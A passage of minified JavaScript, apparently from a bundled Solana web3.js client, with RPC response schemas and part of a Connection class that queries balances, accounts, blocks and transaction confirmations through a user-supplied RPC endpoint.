    wu = ao({ accounts: Yr(ra), data: io(), programId: ra }),
    bu = lo(
      uo([wu, yu]),
      uo([
        ao({ parsed: co(), program: io(), programId: io() }),
        ao({ accounts: Yr(io()), data: io(), programId: io() }),
      ]),
      (t) => Hr(t, "accounts" in t ? wu : yu)
    ),
    vu = ao({
      signatures: Yr(io()),
      message: ao({
        accountKeys: Yr(mu),
        instructions: Yr(bu),
        recentBlockhash: io(),
        addressTableLookups: ro(eo(Yr(hu))),
      }),
    }),
    Au = ao({
      accountIndex: no(),
      mint: io(),
      owner: ro(io()),
      programId: ro(io()),
      uiTokenAmount: Da,
    }),
    ku = ao({ writable: Yr(ra), readonly: Yr(ra) }),
    Iu = ao({
      err: Aa,
      fee: no(),
      innerInstructions: ro(
        eo(
          Yr(
            ao({
              index: no(),
              instructions: Yr(
                ao({ accounts: Yr(no()), data: io(), programIdIndex: no() })
              ),
            })
          )
        )
      ),
      preBalances: Yr(no()),
      postBalances: Yr(no()),
      logMessages: ro(eo(Yr(io()))),
      preTokenBalances: ro(eo(Yr(Au))),
      postTokenBalances: ro(eo(Yr(Au))),
      loadedAddresses: ro(ku),
      computeUnitsConsumed: ro(no()),
    }),
    Su = ao({
      err: Aa,
      fee: no(),
      innerInstructions: ro(eo(Yr(ao({ index: no(), instructions: Yr(bu) })))),
      preBalances: Yr(no()),
      postBalances: Yr(no()),
      logMessages: ro(eo(Yr(io()))),
      preTokenBalances: ro(eo(Yr(Au))),
      postTokenBalances: ro(eo(Yr(Au))),
      loadedAddresses: ro(ku),
      computeUnitsConsumed: ro(no()),
    }),
    _u = uo([to(0), to("legacy")]),
    Tu = ao({
      pubkey: io(),
      lamports: no(),
      postBalance: eo(no()),
      rewardType: eo(io()),
      commission: ro(eo(no())),
    }),
    Cu = la(
      eo(
        ao({
          blockhash: io(),
          previousBlockhash: io(),
          parentSlot: no(),
          transactions: Yr(
            ao({ transaction: pu, meta: eo(Iu), version: ro(_u) })
          ),
          rewards: ro(Yr(Tu)),
          blockTime: eo(no()),
          blockHeight: eo(no()),
        })
      )
    ),
    Bu = la(
      eo(
        ao({
          blockhash: io(),
          previousBlockhash: io(),
          parentSlot: no(),
          rewards: ro(Yr(Tu)),
          blockTime: eo(no()),
          blockHeight: eo(no()),
        })
      )
    ),
    Eu = la(
      eo(
        ao({
          blockhash: io(),
          previousBlockhash: io(),
          parentSlot: no(),
          transactions: Yr(
            ao({ transaction: gu, meta: eo(Iu), version: ro(_u) })
          ),
          rewards: ro(Yr(Tu)),
          blockTime: eo(no()),
          blockHeight: eo(no()),
        })
      )
    ),
    xu = la(
      eo(
        ao({
          blockhash: io(),
          previousBlockhash: io(),
          parentSlot: no(),
          transactions: Yr(
            ao({ transaction: vu, meta: eo(Su), version: ro(_u) })
          ),
          rewards: ro(Yr(Tu)),
          blockTime: eo(no()),
          blockHeight: eo(no()),
        })
      )
    ),
    Pu = la(
      eo(
        ao({
          blockhash: io(),
          previousBlockhash: io(),
          parentSlot: no(),
          transactions: Yr(
            ao({ transaction: gu, meta: eo(Su), version: ro(_u) })
          ),
          rewards: ro(Yr(Tu)),
          blockTime: eo(no()),
          blockHeight: eo(no()),
        })
      )
    ),
    Ru = la(
      eo(
        ao({
          blockhash: io(),
          previousBlockhash: io(),
          parentSlot: no(),
          rewards: ro(Yr(Tu)),
          blockTime: eo(no()),
          blockHeight: eo(no()),
        })
      )
    ),
    Ou = la(
      eo(
        ao({
          blockhash: io(),
          previousBlockhash: io(),
          parentSlot: no(),
          transactions: Yr(ao({ transaction: pu, meta: eo(Iu) })),
          rewards: ro(Yr(Tu)),
          blockTime: eo(no()),
        })
      )
    ),
    Mu = la(
      eo(
        ao({
          blockhash: io(),
          previousBlockhash: io(),
          parentSlot: no(),
          signatures: Yr(io()),
          blockTime: eo(no()),
        })
      )
    ),
    Lu = la(
      eo(
        ao({
          slot: no(),
          meta: eo(Iu),
          blockTime: ro(eo(no())),
          transaction: pu,
          version: ro(_u),
        })
      )
    ),
    Nu = la(
      eo(
        ao({
          slot: no(),
          transaction: vu,
          meta: eo(Su),
          blockTime: ro(eo(no())),
          version: ro(_u),
        })
      )
    ),
    Du = da(ao({ blockhash: io(), lastValidBlockHeight: no() })),
    Uu = da(Qr()),
    qu = la(
      Yr(
        ao({
          slot: no(),
          numTransactions: no(),
          numSlots: no(),
          samplePeriodSecs: no(),
        })
      )
    ),
    Wu = da(eo(ao({ feeCalculator: ao({ lamportsPerSignature: no() }) }))),
    zu = la(io()),
    Ku = la(io()),
    Fu = ao({ err: Aa, logs: Yr(io()), signature: io() }),
    ju = ao({ result: fa(Fu), subscription: no() }),
    Gu = { "solana-client": "js/1.0.0-maintenance" };
  class Vu {
    constructor(t, e) {
      let n, r, o, i, s, a;
      var u;
      (this._commitment = void 0),
        (this._confirmTransactionInitialTimeout = void 0),
        (this._rpcEndpoint = void 0),
        (this._rpcWsEndpoint = void 0),
        (this._rpcClient = void 0),
        (this._rpcRequest = void 0),
        (this._rpcBatchRequest = void 0),
        (this._rpcWebSocket = void 0),
        (this._rpcWebSocketConnected = !1),
        (this._rpcWebSocketHeartbeat = null),
        (this._rpcWebSocketIdleTimeout = null),
        (this._rpcWebSocketGeneration = 0),
        (this._disableBlockhashCaching = !1),
        (this._pollingBlockhash = !1),
        (this._blockhashInfo = {
          latestBlockhash: null,
          lastFetch: 0,
          transactionSignatures: [],
          simulatedSignatures: [],
        }),
        (this._nextClientSubscriptionId = 0),
        (this._subscriptionDisposeFunctionsByClientSubscriptionId = {}),
        (this._subscriptionHashByClientSubscriptionId = {}),
        (this._subscriptionStateChangeCallbacksByHash = {}),
        (this._subscriptionCallbacksByServerSubscriptionId = {}),
        (this._subscriptionsByHash = {}),
        (this._subscriptionsAutoDisposedByRpc = new Set()),
        (this.getBlockHeight = (() => {
          const t = {};
          return async (e) => {
            const { commitment: n, config: r } = sa(e),
              o = this._buildArgs([], n, void 0, r),
              i = Zs(o);
            return (
              (t[i] =
                t[i] ??
                (async () => {
                  try {
                    const t = Hr(
                      await this._rpcRequest("getBlockHeight", o),
                      la(no())
                    );
                    if ("error" in t)
                      throw new Rs(
                        t.error,
                        "failed to get block height information"
                      );
                    return t.result;
                  } finally {
                    delete t[i];
                  }
                })()),
              await t[i]
            );
          };
        })()),
        e && "string" == typeof e
          ? (this._commitment = e)
          : e &&
            ((this._commitment = e.commitment),
            (this._confirmTransactionInitialTimeout =
              e.confirmTransactionInitialTimeout),
            (n = e.wsEndpoint),
            (r = e.httpHeaders),
            (o = e.fetch),
            (i = e.fetchMiddleware),
            (s = e.disableRetryOnRateLimit),
            (a = e.httpAgent)),
        (this._rpcEndpoint = (function (t) {
          if (!1 === /^https?:/.test(t))
            throw new TypeError(
              "Endpoint URL must start with `http:` or `https:`."
            );
          return t;
        })(t)),
        (this._rpcWsEndpoint =
          n ||
          (function (t) {
            const e = t.match(na);
            if (null == e)
              throw TypeError(`Failed to validate endpoint URL \`${t}\``);
            const [n, r, o, i] = e,
              s = t.startsWith("https:") ? "wss:" : "ws:",
              a = null == o ? null : parseInt(o.slice(1), 10);
            return `${s}//${r}${null == a ? "" : `:${a + 1}`}${i}`;
          })(t)),
        (this._rpcClient = (function (t, e, n, r, o, i) {
          const s = n || Qs;
          let a;
          return (
            null != i,
            0,
            r &&
              (a = async (t, e) => {
                const n = await new Promise((n, o) => {
                  try {
                    r(t, e, (t, e) => n([t, e]));
                  } catch (i) {
                    o(i);
                  }
                });
                return await s(...n);
              }),
            new jo(async (n, r) => {
              const i = {
                method: "POST",
                body: n,
                agent: void 0,
                headers: Object.assign(
                  { "Content-Type": "application/json" },
                  e || {},
                  Gu
                ),
              };
              try {
                let e,
                  n = 5,
                  u = 500;
                for (
                  ;
                  (e = a ? await a(t, i) : await s(t, i)),
                    429 === e.status && !0 !== o && ((n -= 1), 0 !== n);

                )
                  void 0, await Ms(u), (u *= 2);
                const c = await e.text();
                e.ok
                  ? r(null, c)
                  : r(new Error(`${e.status} ${e.statusText}: ${c}`));
              } catch (u) {
                u instanceof Error && r(u);
              }
            }, {})
          );
        })(t, r, o, i, s, a)),
        (this._rpcRequest =
          ((u = this._rpcClient),
          (t, e) =>
            new Promise((n, r) => {
              u.request(t, e, (t, e) => {
                if (t) return r(t), void 0;
                n(e);
              });
            }))),
        (this._rpcBatchRequest = (function (t) {
          return (e) =>
            new Promise((n, r) => {
              0 === e.length && n([]);
              const o = e.map((e) => t.request(e.methodName, e.args));
              t.request(o, (t, e) => {
                if (t) return r(t), void 0;
                n(e);
              });
            });
        })(this._rpcClient)),
        (this._rpcWebSocket = new $s(this._rpcWsEndpoint, {
          autoconnect: !1,
          max_reconnects: 1 / 0,
        })),
        this._rpcWebSocket.on("open", this._wsOnOpen.bind(this)),
        this._rpcWebSocket.on("error", this._wsOnError.bind(this)),
        this._rpcWebSocket.on("close", this._wsOnClose.bind(this)),
        this._rpcWebSocket.on(
          "accountNotification",
          this._wsOnAccountNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "programNotification",
          this._wsOnProgramAccountNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "slotNotification",
          this._wsOnSlotNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "slotsUpdatesNotification",
          this._wsOnSlotUpdatesNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "signatureNotification",
          this._wsOnSignatureNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "rootNotification",
          this._wsOnRootNotification.bind(this)
        ),
        this._rpcWebSocket.on(
          "logsNotification",
          this._wsOnLogsNotification.bind(this)
        );
    }
    get commitment() {
      return this._commitment;
    }
    get rpcEndpoint() {
      return this._rpcEndpoint;
    }
    async getBalanceAndContext(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = this._buildArgs([t.toBase58()], n, void 0, r),
        i = Hr(await this._rpcRequest("getBalance", o), da(no()));
      if ("error" in i)
        throw new Rs(i.error, `failed to get balance for ${t.toBase58()}`);
      return i.result;
    }
    async getBalance(t, e) {
      return await this.getBalanceAndContext(t, e)
        .then((t) => t.value)
        .catch((e) => {
          throw new Error(
            "failed to get balance of account " + t.toBase58() + ": " + e
          );
        });
    }
    async getBlockTime(t) {
      const e = Hr(await this._rpcRequest("getBlockTime", [t]), la(eo(no())));
      if ("error" in e)
        throw new Rs(e.error, `failed to get block time for slot ${t}`);
      return e.result;
    }
    async getMinimumLedgerSlot() {
      const t = Hr(await this._rpcRequest("minimumLedgerSlot", []), la(no()));
      if ("error" in t)
        throw new Rs(t.error, "failed to get minimum ledger slot");
      return t.result;
    }
    async getFirstAvailableBlock() {
      const t = Hr(await this._rpcRequest("getFirstAvailableBlock", []), La);
      if ("error" in t)
        throw new Rs(t.error, "failed to get first available block");
      return t.result;
    }
    async getSupply(t) {
      let e = {};
      e =
        "string" == typeof t
          ? { commitment: t }
          : t
          ? { ...t, commitment: (t && t.commitment) || this.commitment }
          : { commitment: this.commitment };
      const n = Hr(await this._rpcRequest("getSupply", [e]), Na);
      if ("error" in n) throw new Rs(n.error, "failed to get supply");
      return n.result;
    }
    async getTokenSupply(t, e) {
      const n = this._buildArgs([t.toBase58()], e),
        r = Hr(await this._rpcRequest("getTokenSupply", n), da(Da));
      if ("error" in r) throw new Rs(r.error, "failed to get token supply");
      return r.result;
    }
    async getTokenAccountBalance(t, e) {
      const n = this._buildArgs([t.toBase58()], e),
        r = Hr(await this._rpcRequest("getTokenAccountBalance", n), da(Da));
      if ("error" in r)
        throw new Rs(r.error, "failed to get token account balance");
      return r.result;
    }
    async getTokenAccountsByOwner(t, e, n) {
      const { commitment: r, config: o } = sa(n);
      let i = [t.toBase58()];
      "mint" in e
        ? i.push({ mint: e.mint.toBase58() })
        : i.push({ programId: e.programId.toBase58() });
      const s = this._buildArgs(i, r, "base64", o),
        a = Hr(await this._rpcRequest("getTokenAccountsByOwner", s), qa);
      if ("error" in a)
        throw new Rs(
          a.error,
          `failed to get token accounts owned by account ${t.toBase58()}`
        );
      return a.result;
    }
    async getParsedTokenAccountsByOwner(t, e, n) {
      let r = [t.toBase58()];
      "mint" in e
        ? r.push({ mint: e.mint.toBase58() })
        : r.push({ programId: e.programId.toBase58() });
      const o = this._buildArgs(r, n, "jsonParsed"),
        i = Hr(await this._rpcRequest("getTokenAccountsByOwner", o), za);
      if ("error" in i)
        throw new Rs(
          i.error,
          `failed to get token accounts owned by account ${t.toBase58()}`
        );
      return i.result;
    }
    async getLargestAccounts(t) {
      const e = { ...t, commitment: (t && t.commitment) || this.commitment },
        n = e.filter || e.commitment ? [e] : [],
        r = Hr(await this._rpcRequest("getLargestAccounts", n), Ka);
      if ("error" in r) throw new Rs(r.error, "failed to get largest accounts");
      return r.result;
    }
    async getTokenLargestAccounts(t, e) {
      const n = this._buildArgs([t.toBase58()], e),
        r = Hr(await this._rpcRequest("getTokenLargestAccounts", n), Ua);
      if ("error" in r)
        throw new Rs(r.error, "failed to get token largest accounts");
      return r.result;
    }
    async getAccountInfoAndContext(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = this._buildArgs([t.toBase58()], n, "base64", r),
        i = Hr(await this._rpcRequest("getAccountInfo", o), da(eo(Fa)));
      if ("error" in i)
        throw new Rs(
          i.error,
          `failed to get info about account ${t.toBase58()}`
        );
      return i.result;
    }
    async getParsedAccountInfo(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = this._buildArgs([t.toBase58()], n, "jsonParsed", r),
        i = Hr(await this._rpcRequest("getAccountInfo", o), da(eo(Va)));
      if ("error" in i)
        throw new Rs(
          i.error,
          `failed to get info about account ${t.toBase58()}`
        );
      return i.result;
    }
    async getAccountInfo(t, e) {
      try {
        return (await this.getAccountInfoAndContext(t, e)).value;
      } catch (n) {
        throw new Error(
          "failed to get info about account " + t.toBase58() + ": " + n
        );
      }
    }
    async getMultipleParsedAccounts(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = t.map((t) => t.toBase58()),
        i = this._buildArgs([o], n, "jsonParsed", r),
        s = Hr(
          await this._rpcRequest("getMultipleAccounts", i),
          da(Yr(eo(Va)))
        );
      if ("error" in s)
        throw new Rs(s.error, `failed to get info for accounts ${o}`);
      return s.result;
    }
    async getMultipleAccountsInfoAndContext(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = t.map((t) => t.toBase58()),
        i = this._buildArgs([o], n, "base64", r),
        s = Hr(
          await this._rpcRequest("getMultipleAccounts", i),
          da(Yr(eo(Fa)))
        );
      if ("error" in s)
        throw new Rs(s.error, `failed to get info for accounts ${o}`);
      return s.result;
    }
    async getMultipleAccountsInfo(t, e) {
      return (await this.getMultipleAccountsInfoAndContext(t, e)).value;
    }
    async getStakeActivation(t, e, n) {
      const { commitment: r, config: o } = sa(e),
        i = this._buildArgs([t.toBase58()], r, void 0, {
          ...o,
          epoch: null != n ? n : null == o ? void 0 : o.epoch,
        }),
        s = Hr(await this._rpcRequest("getStakeActivation", i), la(Xa));
      if ("error" in s)
        throw new Rs(s.error, `failed to get Stake Activation ${t.toBase58()}`);
      return s.result;
    }
    async getProgramAccounts(t, e) {
      const { commitment: n, config: r } = sa(e),
        { encoding: o, ...i } = r || {},
        s = this._buildArgs([t.toBase58()], n, o || "base64", {
          ...i,
          ...(i.filters ? { filters: aa(i.filters) } : null),
        }),
        a = await this._rpcRequest("getProgramAccounts", s),
        u = Yr(ja),
        c = !0 === i.withContext ? Hr(a, da(u)) : Hr(a, la(u));
      if ("error" in c)
        throw new Rs(
          c.error,
          `failed to get accounts owned by program ${t.toBase58()}`
        );
      return c.result;
    }
    async getParsedProgramAccounts(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = this._buildArgs([t.toBase58()], n, "jsonParsed", r),
        i = Hr(await this._rpcRequest("getProgramAccounts", o), la(Yr(Ha)));
      if ("error" in i)
        throw new Rs(
          i.error,
          `failed to get accounts owned by program ${t.toBase58()}`
        );
      return i.result;
    }
    async confirmTransaction(t, e) {
      var n;
      let r, o;
      if ("string" == typeof t) r = t;
      else {
        const e = t;
        if (null == (n = e.abortSignal) ? void 0 : n.aborted)
          return Promise.reject(e.abortSignal.reason);
        r = e.signature;
      }
      try {
        o = or.decode(r);
      } catch (i) {
        throw new Error("signature must be base58 encoded: " + r);
      }
      return (
        us(64 === o.length, "signature has invalid length"),
        "string" == typeof t
          ? await this.confirmTransactionUsingLegacyTimeoutStrategy({
              commitment: e || this.commitment,
              signature: r,
            })
          : "lastValidBlockHeight" in t
          ? await this.confirmTransactionUsingBlockHeightExceedanceStrategy({
              commitment: e || this.commitment,
              strategy: t,
            })
          : await this.confirmTransactionUsingDurableNonceStrategy({
              commitment: e || this.commitment,
              strategy: t,
            })
      );
    }
    getCancellationPromise(t) {
      return new Promise((e, n) => {
        null != t &&
          (t.aborted
            ? n(t.reason)
            : t.addEventListener("abort", () => {
                n(t.reason);
              }));
      });
    }
    getTransactionConfirmationPromise({ commitment: t, signature: e }) {
      let n,
        r,
        o = !1;
      return {
        abortConfirmation: () => {
          r && (r(), (r = void 0)),
            null != n && (this.removeSignatureListener(n), (n = void 0));
        },
        confirmationPromise: new Promise((i, s) => {
          try {
            n = this.onSignature(
              e,
              (t, e) => {
                n = void 0;
                const r = { context: e, value: t };
                i({ __type: gs.PROCESSED, response: r });
              },
              t
            );
            const a = new Promise((t) => {
              null == n
                ? t()
                : (r = this._onSubscriptionStateChange(n, (e) => {
                    "subscribed" === e && t();
                  }));
            });
            (async () => {
              if ((await a, o)) return;
              const n = await this.getSignatureStatus(e);
              if (o) return;
              if (null == n) return;
              const { context: r, value: u } = n;
              if (null != u)
                if (null == u ? void 0 : u.err) s(u.err);
                else {
                  switch (t) {
                    case "confirmed":
                    case "single":
                    case "singleGossip":
                      if ("processed" === u.confirmationStatus) return;
                      break;
                    case "finalized":
                    case "max":
                    case "root":
                      if (
                        "processed" === u.confirmationStatus ||
                        "confirmed" === u.confirmationStatus
                      )
                        return;
                  }
                  (o = !0),
                    i({
                      __type: gs.PROCESSED,
                      response: { context: r, value: u },
                    });
                }
            })();
          } catch (a) {
            s(a);
          }
        }),
      };
    }
    async confirmTransactionUsingBlockHeightExceedanceStrategy({
      commitment: t,
      strategy: { abortSignal: e, lastValidBlockHeight: n, signature: r },
    }) {
      let o = !1;
      const i = new Promise((e) => {
          const r = async () => {
            try {
              return await this.getBlockHeight(t);
            } catch (e) {
              return -1;
            }
          };
          (async () => {
            let t = await r();
            if (!o) {
              for (; t <= n; ) {
                if ((await Ms(1e3), o)) return;
                if (((t = await r()), o)) return;
              }
              e({ __type: gs.BLOCKHEIGHT_EXCEEDED });
            }
          })();
        }),
        { abortConfirmation: s, confirmationPromise: a } =
          this.getTransactionConfirmationPromise({
            commitment: t,
            signature: r,
          }),
        u = this.getCancellationPromise(e);
      let c;
      try {
        const t = await Promise.race([u, a, i]);
        if (t.__type !== gs.PROCESSED) throw new Qi(r);
        c = t.response;
      } finally {
        (o = !0), s();
      }
      return c;
    }
    async confirmTransactionUsingDurableNonceStrategy({
      commitment: t,
      strategy: {
        abortSignal: e,
        minContextSlot: n,
        nonceAccountPubkey: r,
        nonceValue: o,
        signature: i,
      },
    }) {
      let s = !1;
      const a = new Promise((e) => {
          let i = o,
            a = null;
          const u = async () => {
            try {
              const { context: e, value: o } = await this.getNonceAndContext(
                r,
                { commitment: t, minContextSlot: n }
              );
              return (a = e.slot), null == o ? void 0 : o.nonce;
            } catch (e) {
              return i;
            }
          };
          (async () => {
            if (((i = await u()), !s))
              for (;;) {
                if (o !== i)
                  return (
                    e({
                      __type: gs.NONCE_INVALID,
                      slotInWhichNonceDidAdvance: a,
                    }),
                    void 0
                  );
                if ((await Ms(2e3), s)) return;
                if (((i = await u()), s)) return;
              }
          })();
        }),
        { abortConfirmation: u, confirmationPromise: c } =
          this.getTransactionConfirmationPromise({
            commitment: t,
            signature: i,
          }),
        l = this.getCancellationPromise(e);
      let d;
      try {
        const e = await Promise.race([l, c, a]);
        if (e.__type === gs.PROCESSED) d = e.response;
        else {
          let r;
          for (;;) {
            const t = await this.getSignatureStatus(i);
            if (null == t) break;
            if (!(t.context.slot < (e.slotInWhichNonceDidAdvance ?? n))) {
              r = t;
              break;
            }
            await Ms(400);
          }
          if (!(null == r ? void 0 : r.value)) throw new ts(i);
          {
            const e = t || "finalized",
              { confirmationStatus: n } = r.value;
            switch (e) {
              case "processed":
              case "recent":
                if ("processed" !== n && "confirmed" !== n && "finalized" !== n)
                  throw new ts(i);
                break;
              case "confirmed":
              case "single":
              case "singleGossip":
                if ("confirmed" !== n && "finalized" !== n) throw new ts(i);
                break;
              case "finalized":
              case "max":
              case "root":
                if ("finalized" !== n) throw new ts(i);
            }
            d = { context: r.context, value: { err: r.value.err } };
          }
        }
      } finally {
        (s = !0), u();
      }
      return d;
    }
    async confirmTransactionUsingLegacyTimeoutStrategy({
      commitment: t,
      signature: e,
    }) {
      let n;
      const r = new Promise((e) => {
          let r = this._confirmTransactionInitialTimeout || 6e4;
          switch (t) {
            case "processed":
            case "recent":
            case "single":
            case "confirmed":
            case "singleGossip":
              r = this._confirmTransactionInitialTimeout || 3e4;
          }
          n = setTimeout(() => e({ __type: gs.TIMED_OUT, timeoutMs: r }), r);
        }),
        { abortConfirmation: o, confirmationPromise: i } =
          this.getTransactionConfirmationPromise({
            commitment: t,
            signature: e,
          });
      let s;
      try {
        const t = await Promise.race([i, r]);
        if (t.__type !== gs.PROCESSED) throw new $i(e, t.timeoutMs / 1e3);
        s = t.response;
      } finally {
        clearTimeout(n), o();
      }
      return s;
    }
    async getClusterNodes() {
      const t = Hr(await this._rpcRequest("getClusterNodes", []), la(Yr(su)));
      if ("error" in t) throw new Rs(t.error, "failed to get cluster nodes");
      return t.result;
    }
    async getVoteAccounts(t) {
      const e = this._buildArgs([], t),
        n = Hr(await this._rpcRequest("getVoteAccounts", e), uu);
      if ("error" in n) throw new Rs(n.error, "failed to get vote accounts");
      return n.result;
    }
    async getSlot(t) {
      const { commitment: e, config: n } = sa(t),
        r = this._buildArgs([], e, void 0, n),
        o = Hr(await this._rpcRequest("getSlot", r), la(no()));
      if ("error" in o) throw new Rs(o.error, "failed to get slot");
      return o.result;
    }
    async getSlotLeader(t) {
      const { commitment: e, config: n } = sa(t),
        r = this._buildArgs([], e, void 0, n),
        o = Hr(await this._rpcRequest("getSlotLeader", r), la(io()));
      if ("error" in o) throw new Rs(o.error, "failed to get slot leader");
      return o.result;
    }
    async getSlotLeaders(t, e) {
      const n = [t, e],
        r = Hr(await this._rpcRequest("getSlotLeaders", n), la(Yr(ra)));
      if ("error" in r) throw new Rs(r.error, "failed to get slot leaders");
      return r.result;
    }
    async getSignatureStatus(t, e) {
      const { context: n, value: r } = await this.getSignatureStatuses([t], e);
      us(1 === r.length);
      return { context: n, value: r[0] };
    }
    async getSignatureStatuses(t, e) {
      const n = [t];
      e && n.push(e);
      const r = Hr(await this._rpcRequest("getSignatureStatuses", n), du);
      if ("error" in r) throw new Rs(r.error, "failed to get signature status");
      return r.result;
    }
    async getTransactionCount(t) {
      const { commitment: e, config: n } = sa(t),
        r = this._buildArgs([], e, void 0, n),
        o = Hr(await this._rpcRequest("getTransactionCount", r), la(no()));
      if ("error" in o)
        throw new Rs(o.error, "failed to get transaction count");
      return o.result;
    }
    async getTotalSupply(t) {
      return (
        await this.getSupply({
          commitment: t,
          excludeNonCirculatingAccountsList: !0,
        })
      ).value.total;
    }
    async getInflationGovernor(t) {
      const e = this._buildArgs([], t),
        n = Hr(await this._rpcRequest("getInflationGovernor", e), Ea);
      if ("error" in n) throw new Rs(n.error, "failed to get inflation");
      return n.result;
    }
    async getInflationReward(t, e, n) {
      const { commitment: r, config: o } = sa(n),
        i = this._buildArgs([t.map((t) => t.toBase58())], r, void 0, {
          ...o,
          epoch: null != e ? e : null == o ? void 0 : o.epoch,
        }),
        s = Hr(await this._rpcRequest("getInflationReward", i), ma);
      if ("error" in s) throw new Rs(s.error, "failed to get inflation reward");
      return s.result;
    }
    async getInflationRate() {
      const t = Hr(await this._rpcRequest("getInflationRate", []), xa);
      if ("error" in t) throw new Rs(t.error, "failed to get inflation rate");
      return t.result;
    }
    async getEpochInfo(t) {
      const { commitment: e, config: n } = sa(t),
        r = this._buildArgs([], e, void 0, n),
        o = Hr(await this._rpcRequest("getEpochInfo", r), Ra);
      if ("error" in o) throw new Rs(o.error, "failed to get epoch info");
      return o.result;
    }
    async getEpochSchedule() {
      const t = Hr(await this._rpcRequest("getEpochSchedule", []), Oa);
      if ("error" in t) throw new Rs(t.error, "failed to get epoch schedule");
      const e = t.result;
      return new Ys(
        e.slotsPerEpoch,
        e.leaderScheduleSlotOffset,
        e.warmup,
        e.firstNormalEpoch,
        e.firstNormalSlot
      );
    }
    async getLeaderSchedule() {
      const t = Hr(await this._rpcRequest("getLeaderSchedule", []), Ma);
      if ("error" in t) throw new Rs(t.error, "failed to get leader schedule");
      return t.result;
    }
    async getMinimumBalanceForRentExemption(t, e) {
      const n = this._buildArgs([t], e),
        r = Hr(
          await this._rpcRequest("getMinimumBalanceForRentExemption", n),
          fu
        );
      return "error" in r ? (void 0, 0) : r.result;
    }
    async getRecentBlockhashAndContext(t) {
      const {
        context: e,
        value: { blockhash: n },
      } = await this.getLatestBlockhashAndContext(t);
      return {
        context: e,
        value: {
          blockhash: n,
          feeCalculator: {
            get lamportsPerSignature() {
              throw new Error(
                "The capability to fetch `lamportsPerSignature` using the `getRecentBlockhash` API is no longer offered by the network. Use the `getFeeForMessage` API to obtain the fee for a given message."
              );
            },
            toJSON: () => ({}),
          },
        },
      };
    }
    async getRecentPerformanceSamples(t) {
      const e = Hr(
        await this._rpcRequest("getRecentPerformanceSamples", t ? [t] : []),
        qu
      );
      if ("error" in e)
        throw new Rs(e.error, "failed to get recent performance samples");
      return e.result;
    }
    async getFeeCalculatorForBlockhash(t, e) {
      const n = this._buildArgs([t], e),
        r = Hr(await this._rpcRequest("getFeeCalculatorForBlockhash", n), Wu);
      if ("error" in r) throw new Rs(r.error, "failed to get fee calculator");
      const { context: o, value: i } = r.result;
      return { context: o, value: null !== i ? i.feeCalculator : null };
    }
    async getFeeForMessage(t, e) {
      const n = Ki(t.serialize()).toString("base64"),
        r = this._buildArgs([n], e),
        o = Hr(await this._rpcRequest("getFeeForMessage", r), da(eo(no())));
      if ("error" in o) throw new Rs(o.error, "failed to get fee for message");
      if (null === o.result) throw new Error("invalid blockhash");
      return o.result;
    }
    async getRecentPrioritizationFees(t) {
      var e;
      const n =
          null == (e = null == t ? void 0 : t.lockedWritableAccounts)
            ? void 0
            : e.map((t) => t.toBase58()),
        r = (null == n ? void 0 : n.length) ? [n] : [],
        o = Hr(await this._rpcRequest("getRecentPrioritizationFees", r), Pa);
      if ("error" in o)
        throw new Rs(o.error, "failed to get recent prioritization fees");
      return o.result;
    }
    async getRecentBlockhash(t) {
      try {
        return (await this.getRecentBlockhashAndContext(t)).value;
      } catch (e) {
        throw new Error("failed to get recent blockhash: " + e);
      }
    }
    async getLatestBlockhash(t) {
      try {
        return (await this.getLatestBlockhashAndContext(t)).value;
      } catch (e) {
        throw new Error("failed to get recent blockhash: " + e);
      }
    }
    async getLatestBlockhashAndContext(t) {
      const { commitment: e, config: n } = sa(t),
        r = this._buildArgs([], e, void 0, n),
        o = Hr(await this._rpcRequest("getLatestBlockhash", r), Du);
      if ("error" in o) throw new Rs(o.error, "failed to get latest blockhash");
      return o.result;
    }
    async isBlockhashValid(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = this._buildArgs([t], n, void 0, r),
        i = Hr(await this._rpcRequest("isBlockhashValid", o), Uu);
      if ("error" in i)
        throw new Rs(
          i.error,
          "failed to determine if the blockhash `" + t + "`is valid"
        );
      return i.result;
    }
    async getVersion() {
      const t = Hr(await this._rpcRequest("getVersion", []), la(Sa));
      if ("error" in t) throw new Rs(t.error, "failed to get version");
      return t.result;
    }
    async getGenesisHash() {
      const t = Hr(await this._rpcRequest("getGenesisHash", []), la(io()));
      if ("error" in t) throw new Rs(t.error, "failed to get genesis hash");
      return t.result;
    }
    async getBlock(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = this._buildArgsAtLeastConfirmed([t], n, void 0, r),
        i = await this._rpcRequest("getBlock", o);
      try {
        switch (null == r ? void 0 : r.transactionDetails) {
          case "accounts": {
            const t = Hr(i, Eu);
            if ("error" in t) throw t.error;
            return t.result;
          }
          case "none": {
            const t = Hr(i, Bu);
            if ("error" in t) throw t.error;
            return t.result;
          }
          default: {
            const t = Hr(i, Cu);
            if ("error" in t) throw t.error;
            const { result: e } = t;
            return e
              ? {
                  ...e,
                  transactions: e.transactions.map(
                    ({ transaction: t, meta: e, version: n }) => ({
                      meta: e,
                      transaction: { ...t, message: ha(n, t.message) },
                      version: n,
                    })
                  ),
                }
              : null;
          }
        }
      } catch (s) {
        throw new Rs(s, "failed to get confirmed block");
      }
    }
    async getParsedBlock(t, e) {
      const { commitment: n, config: r } = sa(e),
        o = this._buildArgsAtLeastConfirmed([t], n, "jsonParsed", r),
        i = await this._rpcRequest("getBlock", o);
      try {
        switch (null == r ? void 0 : r.transactionDetails) {
          case "accounts": {
            const t = Hr(i, Pu);
            if ("error" in t) throw t.error;
            return t.result;
          }
          case "none": {
            const t = Hr(i, Ru);
            if ("error" in t) throw t.error;
            return t.result;
          }
          default: {
            const t = Hr(i, xu);
            if ("error" in t) throw t.error;
            return t.result;
          }
        }
      } catch (s) {
        throw new Rs(s, "failed to get block");
      }
    }
    async getBlockProduction(t) {
      let e, n;
      if ("string" == typeof t) n = t;
      else if (t) {
        const { commitment: r, ...o } = t;
        (n = r), (e = o);
      }
      const r = this._buildArgs([], n, "base64", e),
        o = Hr(await this._rpcRequest("getBlockProduction", r), Ba);
